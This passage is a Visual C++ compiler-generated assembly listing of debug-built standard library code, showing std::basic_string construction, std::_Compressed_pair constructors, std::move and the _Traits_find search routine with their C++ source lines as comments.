	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2687 : 
; 2688 : #if _HAS_CXX20
; 2689 :         if (_STD is_constant_evaluated()) {
; 2690 :             _My_data._Myres = _BUF_SIZE; // TRANSITION: constexpr SSO
; 2691 :         }
; 2692 : 
; 2693 :         const bool _Stay_small = _Count < _BUF_SIZE && !_STD is_constant_evaluated();
; 2694 : #else // ^^^ _HAS_CXX20 / !_HAS_CXX20 vvv
; 2695 :         const bool _Stay_small = _Count < _BUF_SIZE;

	cmp	QWORD PTR _Count$[rsp], 16
	jae	SHORT $LN5@Construct
	mov	BYTE PTR tv79[rsp], 1
	jmp	SHORT $LN6@Construct
$LN5@Construct:
	mov	BYTE PTR tv79[rsp], 0
$LN6@Construct:
	movzx	eax, BYTE PTR tv79[rsp]
	mov	BYTE PTR _Stay_small$[rsp], al

; 2696 : #endif // _HAS_CXX20
; 2697 : 
; 2698 :         if (_Stay_small) {

	movzx	eax, BYTE PTR _Stay_small$[rsp]
	test	eax, eax
	je	SHORT $LN3@Construct

; 2699 : #if _HAS_CXX20
; 2700 :             // TRANSITION: This is currently unused until SSO support is merged
; 2701 :             if (_STD is_constant_evaluated()) {
; 2702 :                 _Construct_in_place(_My_data._Bx);
; 2703 :             }
; 2704 : #endif // _HAS_CXX20
; 2705 : 
; 2706 :             _My_data._Mysize = _Count;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 2707 :             _My_data._Myres  = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 15

; 2708 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2709 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2710 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2711 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2712 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _Count);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Arg$[rsp]
	mov	rcx, rax
	call	?move@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::move

; 2713 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

	mov	BYTE PTR $T1[rsp], 0
	mov	rax, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _My_data$[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 2714 :             } else { // _Strat == _Construct_strategy::_From_string
; 2715 : #ifdef _INSERT_STRING_ANNOTATION
; 2716 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _Count);
; 2717 : #else // ^^^ _INSERT_STRING_ANNOTATION ^^^ // vvv !_INSERT_STRING_ANNOTATION vvv
; 2718 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2719 : #endif // !_INSERT_STRING_ANNOTATION
; 2720 :             }
; 2721 : 
; 2722 :             _ASAN_STRING_CREATE(*this);
; 2723 :             _Proxy._Release();

	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2724 :             return;

	jmp	$LN1@Construct
$LN3@Construct:

; 2725 :         }
; 2726 : 
; 2727 :         _My_data._Myres               = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 15

; 2728 :         const size_type _New_capacity = _Calculate_growth(_Count);

	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
	mov	QWORD PTR _New_capacity$[rsp], rax

; 2729 :         const pointer _New_ptr        = _Al.allocate(_New_capacity + 1); // throws

	mov	rax, QWORD PTR _New_capacity$[rsp]
	inc	rax
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@D@std@@QEAAPEAD_K@Z ; std::allocator<char>::allocate
	mov	QWORD PTR _New_ptr$[rsp], rax

; 2730 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	rax, QWORD PTR _My_data$[rsp]
	lea	rdx, QWORD PTR _New_ptr$[rsp]
	mov	rcx, rax
	call	??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z ; std::_Construct_in_place<char *,char * const &>

; 2731 : 
; 2732 : #if _HAS_CXX20
; 2733 :         if (_STD is_constant_evaluated()) { // Begin the lifetimes of the objects before copying to avoid UB
; 2734 :             _Traits::assign(_Unfancy(_New_ptr), _New_capacity + 1, _Elem());
; 2735 :         }
; 2736 : #endif // _HAS_CXX20
; 2737 : 
; 2738 :         _My_data._Mysize = _Count;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 2739 :         _My_data._Myres  = _New_capacity;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_capacity$[rsp]
	mov	QWORD PTR [rax+24], rcx

; 2740 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2741 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2742 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2743 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2744 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);

	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Arg$[rsp]
	mov	rcx, rax
	call	?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::copy

; 2745 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

	mov	BYTE PTR $T2[rsp], 0
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	add	rax, QWORD PTR _Count$[rsp]
	lea	rdx, QWORD PTR $T2[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 2746 :         } else { // _Strat == _Construct_strategy::_From_string
; 2747 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);
; 2748 :         }
; 2749 : 
; 2750 :         _ASAN_STRING_CREATE(*this);
; 2751 :         _Proxy._Release();

	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:
$LN4@Construct:

; 2752 :     }

	add	rsp, 88					; 00000058H
	ret	0
??$_Construct@$00PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<1,char const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Construct@$0A@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXD_K@Z
_TEXT	SEGMENT
tv79 = 32
_Proxy$ = 33
_Stay_small$ = 34
$T1 = 35
$T2 = 36
_My_data$ = 40
_New_ptr$ = 48
_New_capacity$ = 56
_Alproxy$ = 64
_Al$ = 72
this$ = 96
_Arg$ = 104
_Count$ = 112
??$_Construct@$0A@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXD_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<0,char>, COMDAT

; 2672 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN7:
	mov	QWORD PTR [rsp+24], r8
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 2673 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2674 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2675 :         } else {
; 2676 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2677 :         }
; 2678 : 
; 2679 :         if (_Count > max_size()) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
	cmp	QWORD PTR _Count$[rsp], rax
	jbe	SHORT $LN2@Construct

; 2680 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Construct:

; 2681 :         }
; 2682 : 
; 2683 :         auto& _My_data  = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 2684 :         auto& _Al       = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 2685 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

	lea	rax, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	QWORD PTR _Alproxy$[rsp], rax

; 2686 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

	mov	r8, QWORD PTR _My_data$[rsp]
	mov	rdx, QWORD PTR _Alproxy$[rsp]
	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2687 : 
; 2688 : #if _HAS_CXX20
; 2689 :         if (_STD is_constant_evaluated()) {
; 2690 :             _My_data._Myres = _BUF_SIZE; // TRANSITION: constexpr SSO
; 2691 :         }
; 2692 : 
; 2693 :         const bool _Stay_small = _Count < _BUF_SIZE && !_STD is_constant_evaluated();
; 2694 : #else // ^^^ _HAS_CXX20 / !_HAS_CXX20 vvv
; 2695 :         const bool _Stay_small = _Count < _BUF_SIZE;

	cmp	QWORD PTR _Count$[rsp], 16
	jae	SHORT $LN5@Construct
	mov	BYTE PTR tv79[rsp], 1
	jmp	SHORT $LN6@Construct
$LN5@Construct:
	mov	BYTE PTR tv79[rsp], 0
$LN6@Construct:
	movzx	eax, BYTE PTR tv79[rsp]
	mov	BYTE PTR _Stay_small$[rsp], al

; 2696 : #endif // _HAS_CXX20
; 2697 : 
; 2698 :         if (_Stay_small) {

	movzx	eax, BYTE PTR _Stay_small$[rsp]
	test	eax, eax
	je	SHORT $LN3@Construct

; 2699 : #if _HAS_CXX20
; 2700 :             // TRANSITION: This is currently unused until SSO support is merged
; 2701 :             if (_STD is_constant_evaluated()) {
; 2702 :                 _Construct_in_place(_My_data._Bx);
; 2703 :             }
; 2704 : #endif // _HAS_CXX20
; 2705 : 
; 2706 :             _My_data._Mysize = _Count;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 2707 :             _My_data._Myres  = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 15

; 2708 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2709 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);

	mov	rax, QWORD PTR _My_data$[rsp]
	movzx	r8d, BYTE PTR _Arg$[rsp]
	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z ; std::_Narrow_char_traits<char,int>::assign

; 2710 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

	mov	BYTE PTR $T1[rsp], 0
	mov	rax, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _My_data$[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 2711 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2712 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _Count);
; 2713 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2714 :             } else { // _Strat == _Construct_strategy::_From_string
; 2715 : #ifdef _INSERT_STRING_ANNOTATION
; 2716 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _Count);
; 2717 : #else // ^^^ _INSERT_STRING_ANNOTATION ^^^ // vvv !_INSERT_STRING_ANNOTATION vvv
; 2718 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2719 : #endif // !_INSERT_STRING_ANNOTATION
; 2720 :             }
; 2721 : 
; 2722 :             _ASAN_STRING_CREATE(*this);
; 2723 :             _Proxy._Release();

	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2724 :             return;

	jmp	$LN1@Construct
$LN3@Construct:

; 2725 :         }
; 2726 : 
; 2727 :         _My_data._Myres               = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 15

; 2728 :         const size_type _New_capacity = _Calculate_growth(_Count);

	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
	mov	QWORD PTR _New_capacity$[rsp], rax

; 2729 :         const pointer _New_ptr        = _Al.allocate(_New_capacity + 1); // throws

	mov	rax, QWORD PTR _New_capacity$[rsp]
	inc	rax
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@D@std@@QEAAPEAD_K@Z ; std::allocator<char>::allocate
	mov	QWORD PTR _New_ptr$[rsp], rax

; 2730 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	rax, QWORD PTR _My_data$[rsp]
	lea	rdx, QWORD PTR _New_ptr$[rsp]
	mov	rcx, rax
	call	??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z ; std::_Construct_in_place<char *,char * const &>

; 2731 : 
; 2732 : #if _HAS_CXX20
; 2733 :         if (_STD is_constant_evaluated()) { // Begin the lifetimes of the objects before copying to avoid UB
; 2734 :             _Traits::assign(_Unfancy(_New_ptr), _New_capacity + 1, _Elem());
; 2735 :         }
; 2736 : #endif // _HAS_CXX20
; 2737 : 
; 2738 :         _My_data._Mysize = _Count;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 2739 :         _My_data._Myres  = _New_capacity;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_capacity$[rsp]
	mov	QWORD PTR [rax+24], rcx

; 2740 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2741 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);

	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	movzx	r8d, BYTE PTR _Arg$[rsp]
	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z ; std::_Narrow_char_traits<char,int>::assign

; 2742 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

	mov	BYTE PTR $T2[rsp], 0
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	add	rax, QWORD PTR _Count$[rsp]
	lea	rdx, QWORD PTR $T2[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 2743 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2744 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);
; 2745 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2746 :         } else { // _Strat == _Construct_strategy::_From_string
; 2747 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);
; 2748 :         }
; 2749 : 
; 2750 :         _ASAN_STRING_CREATE(*this);
; 2751 :         _Proxy._Release();

	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:
$LN4@Construct:

; 2752 :     }

	add	rsp, 88					; 00000058H
	ret	0
??$_Construct@$0A@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXD_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<0,char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
this$ = 48
__formal$ = 56
??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>, COMDAT

; 1375 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??0?$allocator@D@std@@QEAA@XZ		; std::allocator<char>::allocator<char>
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??0?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@D@1@@Z
_TEXT	SEGMENT
this$ = 48
__formal$ = 56
_Val1$ = 64
??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@D@1@@Z PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >, COMDAT

; 1380 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR _Val1$[rsp]
	call	??$forward@V?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z ; std::forward<std::allocator<char> >
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??0?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@D@1@@Z ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$move@AEAV?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEAV?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z PROC ; std::move<std::allocator<char> &>, COMDAT

; 1422 : _NODISCARD constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept { // forward _Arg as movable

	mov	QWORD PTR [rsp+8], rcx

; 1423 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1424 : }

	ret	0
??$move@AEAV?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z ENDP ; std::move<std::allocator<char> &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z
_TEXT	SEGMENT
_Match_try$1 = 32
_Possible_matches_end$ = 40
_Haystack$ = 64
_Hay_size$ = 72
_Start_at$ = 80
_Needle$ = 88
_Needle_size$ = 96
??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z PROC ; std::_Traits_find<std::char_traits<char> >, COMDAT

; 605  :     const size_t _Needle_size) noexcept {

$LN11:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 606  :     // search [_Haystack, _Haystack + _Hay_size) for [_Needle, _Needle + _Needle_size), at/after _Start_at
; 607  :     if (_Needle_size > _Hay_size || _Start_at > _Hay_size - _Needle_size) {

	mov	rax, QWORD PTR _Hay_size$[rsp]
	cmp	QWORD PTR _Needle_size$[rsp], rax
	ja	SHORT $LN6@Traits_fin
	mov	rax, QWORD PTR _Needle_size$[rsp]
	mov	rcx, QWORD PTR _Hay_size$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	cmp	QWORD PTR _Start_at$[rsp], rax
	jbe	SHORT $LN5@Traits_fin
$LN6@Traits_fin:

; 608  :         // xpos cannot exist, report failure
; 609  :         // N4659 24.3.2.7.2 [string.find]/1 says:
; 610  :         // 1. _Start_at <= xpos
; 611  :         // 2. xpos + _Needle_size <= _Hay_size;
; 612  :         // therefore:
; 613  :         // 3. _Needle_size <= _Hay_size (by 2) (checked above)
; 614  :         // 4. _Start_at + _Needle_size <= _Hay_size (substitute 1 into 2)
; 615  :         // 5. _Start_at <= _Hay_size - _Needle_size (4, move _Needle_size to other side) (also checked above)
; 616  :         return static_cast<size_t>(-1);

	mov	rax, -1
	jmp	$LN1@Traits_fin
$LN5@Traits_fin:

; 617  :     }
; 618  : 
; 619  :     if (_Needle_size == 0) { // empty string always matches if xpos is possible

	cmp	QWORD PTR _Needle_size$[rsp], 0
	jne	SHORT $LN7@Traits_fin

; 620  :         return _Start_at;

	mov	rax, QWORD PTR _Start_at$[rsp]
	jmp	$LN1@Traits_fin
$LN7@Traits_fin:

; 621  :     }
; 622  : 
; 623  :     const auto _Possible_matches_end = _Haystack + (_Hay_size - _Needle_size) + 1;

	mov	rax, QWORD PTR _Needle_size$[rsp]
	mov	rcx, QWORD PTR _Hay_size$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _Haystack$[rsp]
	lea	rax, QWORD PTR [rcx+rax+1]
	mov	QWORD PTR _Possible_matches_end$[rsp], rax

; 624  :     for (auto _Match_try = _Haystack + _Start_at;; ++_Match_try) {

	mov	rax, QWORD PTR _Start_at$[rsp]
	mov	rcx, QWORD PTR _Haystack$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Match_try$1[rsp], rax
	jmp	SHORT $LN4@Traits_fin
$LN2@Traits_fin:
	mov	rax, QWORD PTR _Match_try$1[rsp]
	inc	rax
	mov	QWORD PTR _Match_try$1[rsp], rax
$LN4@Traits_fin:

; 625  :         _Match_try = _Traits::find(_Match_try, static_cast<size_t>(_Possible_matches_end - _Match_try), *_Needle);

	mov	rax, QWORD PTR _Match_try$1[rsp]
	mov	rcx, QWORD PTR _Possible_matches_end$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	r8, QWORD PTR _Needle$[rsp]
	mov	rdx, rax
	mov	rcx, QWORD PTR _Match_try$1[rsp]
	call	?find@?$_Narrow_char_traits@DH@std@@SAPEBDQEBD_KAEBD@Z ; std::_Narrow_char_traits<char,int>::find
	mov	QWORD PTR _Match_try$1[rsp], rax

; 626  :         if (!_Match_try) { // didn't find first character; report failure

	cmp	QWORD PTR _Match_try$1[rsp], 0
	jne	SHORT $LN8@Traits_fin

; 627  :             return static_cast<size_t>(-1);

	mov	rax, -1
	jmp	SHORT $LN1@Traits_fin
$LN8@Traits_fin:

; 628  :         }
; 629  : 
; 630  :         if (_Traits::compare(_Match_try, _Needle, _Needle_size) == 0) { // found match

	mov	r8, QWORD PTR _Needle_size$[rsp]
	mov	rdx, QWORD PTR _Needle$[rsp]
	mov	rcx, QWORD PTR _Match_try$1[rsp]
	call	?compare@?$_Narrow_char_traits@DH@std@@SAHQEBD0_K@Z ; std::_Narrow_char_traits<char,int>::compare
	test	eax, eax
	jne	SHORT $LN9@Traits_fin

; 631  :             return static_cast<size_t>(_Match_try - _Haystack);

	mov	rax, QWORD PTR _Haystack$[rsp]
	mov	rcx, QWORD PTR _Match_try$1[rsp]
	sub	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@Traits_fin
$LN9@Traits_fin:

; 632  :         }
; 633  :     }

	jmp	SHORT $LN2@Traits_fin
$LN1@Traits_fin:

; 634  : }

	add	rsp, 56					; 00000038H
	ret	0
??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z ENDP ; std::_Traits_find<std::char_traits<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
_TEXT	SEGMENT
tv79 = 32
_Proxy$ = 33
_Stay_small$ = 34
_My_data$ = 40
_New_capacity$ = 48
_New_ptr$ = 56
_Alproxy$ = 64
_Al$ = 72
tv140 = 80
this$ = 112
_Arg$ = 120
_Count$ = 128
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>, COMDAT

; 2672 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN7:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H

; 2673 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
